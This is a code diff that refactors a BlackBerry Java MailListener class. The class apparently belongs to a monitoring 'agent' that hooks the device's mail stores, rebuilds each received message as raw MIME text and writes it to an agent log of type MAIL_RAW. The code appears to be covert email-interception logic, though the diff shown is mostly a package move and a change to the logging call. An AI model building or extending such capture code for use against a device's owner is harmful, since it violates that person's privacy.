@@ -1,7 +1,7 @@
 /**
  * 
  */
-package blackberry.agent;
+package blackberry.agent.mail;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
@@ -33,13 +33,14 @@ import net.rim.device.api.servicebook.ServiceBook;
 import net.rim.device.api.servicebook.ServiceRecord;
 import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.IntHashtable;
-import blackberry.agent.mail.Mail;
-import blackberry.agent.mail.MailParser;
+import blackberry.agent.MessageAgent;
+import blackberry.log.LogType;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 import blackberry.utils.StringPair;
+import blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -209,7 +210,9 @@ public final class MailListener implements FolderListener, StoreListener,
         try {
 
             final int flags = 1;
+            String mail = parseMessage(message, maxMessageSize);
             final int size = message.getSize();
+
             final DateTime filetime = new DateTime(message.getReceivedDate());
 
             final byte[] additionalData = new byte[20];
@@ -222,15 +225,11 @@ public final class MailListener implements FolderListener, StoreListener,
             databuffer.writeLong(filetime.getFiledate());
             Check.ensures(additionalData.length == 20, "Wrong buffer size");
 
-            String mail = parseMessage(message, maxMessageSize);
             //#debug debug
             debug.trace("saveLog: " + mail);
 
-            messageAgent.createLog(additionalData, mail.getBytes("UTF-8"));
+            messageAgent.createLog(additionalData, WChar.getBytes(mail), LogType.MAIL_RAW);
 
-        } catch (final IOException ex) {
-            //#debug error
-            debug.error("saveLog message: " + ex);
         } catch (final Exception ex) {
             //#debug error
             debug.error("saveLog message: " + ex);
@@ -379,7 +378,7 @@ public final class MailListener implements FolderListener, StoreListener,
                     + boundary + "\r\n\r\n");
             mailRaw.append("\r\n--" + boundary + "\r\n");
         }
-        
+
         if (mail.hasText()) {
             mailRaw.append("Content-type: text/plain; charset=UTF8\r\n\r\n");
             mailRaw.append(mail.plainTextMessage);
@@ -400,7 +399,7 @@ public final class MailListener implements FolderListener, StoreListener,
         }
 
         mailRaw.append("\r\n");
-        
+
         String craftedMail = mailRaw.toString();
 
         return craftedMail;
